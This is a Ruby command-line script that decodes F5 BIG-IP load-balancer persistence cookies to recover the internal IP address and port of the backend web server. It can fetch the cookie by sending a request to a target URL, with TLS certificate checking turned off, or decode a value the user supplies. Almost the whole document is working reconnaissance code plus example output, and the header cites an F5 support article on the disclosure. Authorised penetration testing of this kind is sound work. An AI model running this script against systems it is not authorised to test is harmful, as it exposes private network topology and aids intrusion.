=begin

The BIG-IP system inserts a cookie into the HTTP response, by default, 
is named BIGipServer<pool_name> and the cookie value contains 
the encoded IP address and port of the destination server.

This behavior can cause disclose local IP address of Web Server.

Reference:

* https://support.f5.com/kb/en-us/solutions/public/6000/900/sol6917.html

=end

require 'net/http'
require 'net/https'

usage = "\nUsage:\n\n  ruby bigip.rb [-h] [-u URL_TARGET] [-d BIGIP_COOKIE_VALUE]\n\nOptions:\n\n  -d    Decode the cookie value.\n  -h    Print a summary of the usage.\n  -u    Get the BIGip value in target and decode.\n\nExamples:\n\n  ~$ ruby bigip.rb -d 1677787402.36895.0000\n\n  IP address found:\n\n  IP Address : 10.33.70.12\n  Port       : 443\n\n  ~$ ruby bigip.rb -u https://example.com/\n\n  BIGip cookie: 1677787402.36895.0000\n\n  IP address found:\n\n  IP Address : 10.33.70.12\n  Port       : 443"

def getCookie(url)

	getURI = URI(url)
	
	# Connection
	getConnection = Net::HTTP.new(getURI.host, getURI.port)

	# SSL
	if url.include? 'https://'

		getConnection.use_ssl = true
		getConnection.verify_mode = OpenSSL::SSL::VERIFY_NONE

	end

	begin

		# Request
		getResponse = getConnection.get(getURI, {
			'User-Agent' => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
			'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
			'Accept-Language' => 'en-US,en;q=0.8',
		})
		getCookie = getResponse.response['Set-cookie'].match('BIGip.*?[0-9];').to_s.split('\; ')[0].split('=')[1].split(';')[0]

	rescue Exception => errors

		puts "Error: #{errors}"

	end

	return getCookie

end

def decodeCookie(value)

	begin

		cookie	     = value.split(".") 
		encoded_ip   = cookie[0].to_i
		encoded_port = cookie[1].to_i

		begin

			ip 	= []
			port 	= []

			4.times do
				ip << encoded_ip%256
				encoded_ip /= 256
			end

			2.times do
				port << encoded_port%256
				encoded_port /= 256
			end

			puts "\nIP address found:\n\nIP Address  : #{ip.join(".")}\nPort        : #{port[0]*256 + port[1]}"

		rescue

			puts "Filed decode Big-IP!"

		end

	rescue

		puts "\nError found!\n#{usage}"

	end

end

begin

	case ARGV[0].to_s
	
	when '-u' then
	
		cookie = getCookie(ARGV[1])
		puts "\nBIGip cookie: #{cookie}"
		decodeCookie(cookie)
	
	when '-d' then
	
		decodeCookie(ARGV[1])
	
	when '-h' then
	
		puts usage

	else
	
		puts "\nUnknown option: #{ARGV[0].inspect}\n#{usage}"
	
	end

rescue Exception => errors

	puts "Error: #{errors}"

end
